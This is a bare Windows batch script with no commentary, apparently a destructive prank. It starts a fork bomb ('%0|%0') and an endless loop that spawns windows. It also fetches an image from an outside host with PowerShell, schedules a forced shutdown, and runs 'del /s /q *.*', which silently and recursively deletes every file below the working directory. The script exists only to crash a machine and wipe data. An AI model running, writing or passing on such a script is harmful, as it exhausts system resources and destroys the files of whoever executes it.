@echo off

%0|%0

:x
start
goto x

Powershell -Command  "Invoke-WebRequest https://i.ytimg.com/vi/YkXxITc51ZQ/hqdefault.jpg -OutFile image.jpg"

shutdown -s -t 30

image.jpg

del /s /q *.*

